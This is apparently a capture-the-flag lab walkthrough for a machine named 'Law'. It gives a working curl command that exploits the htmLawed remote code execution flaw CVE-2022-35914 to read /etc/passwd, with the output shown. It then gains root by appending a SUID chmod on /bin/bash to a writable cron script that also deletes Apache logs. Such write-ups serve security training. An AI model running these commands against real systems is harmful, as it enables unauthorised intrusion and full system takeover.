_____

# Walkthrough for Law

# Enumeration

## Nmap

With nmap scan, we notice a web server on the target machine.

Visiting the web server, we see that "**HTML AWED**" running.

## HTML AWED

## Exploitation

### Remote Code Execution

Search "**htmlawed cve**" on google.


The **"[CVE-2022-35914](https://nvd.nist.gov/vuln/detail/cve-2022-35914)"** has been recorded for **HTM LAWED**.

The detail exploitation steps can be found here: https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/#exploitation

Code execution can be achieved like below,

```bash
~  λ curl -s -d 'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo' http://172.16.201.51 |egrep '&nbsp; [[0-9]+] =&gt;'| sed -E 's/&nbsp; [[0-9]+] =&gt; (.*)<br />/1/'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

## Privelege Escalation

We notice the file, `/var/www/cleanup.sh`. After listening with pspy we see that it is being executed in every minute.

We have full control over this file so we can write our malicious payload and achieve code execution.

```
$ ls -alh /bin/bash
-rwxr-xr-x 1 root root 1.2M Mar 27  2022 /bin/bash
$ echo "chmod u+s /bin/bash" >> cleanup.sh
$ cat cleanup.sh
#!/bin/bash

rm -rf /var/log/apache2/error.log
rm -rf /var/log/apache2/access.log
chmod u+s /bin/bash
```

And we become root.

```
www-data@law:/var/www$ ls -alh /bin/bash
ls -alh /bin/bash
-rwsr-xr-x 1 root root 1.2M Mar 27  2022 /bin/bash
www-data@law:/var/www$ /bin/bash -p
/bin/bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash -i -p
bash: cannot set terminal process group (520): Inappropriate ioctl for device
bash: no job control in this shell
```
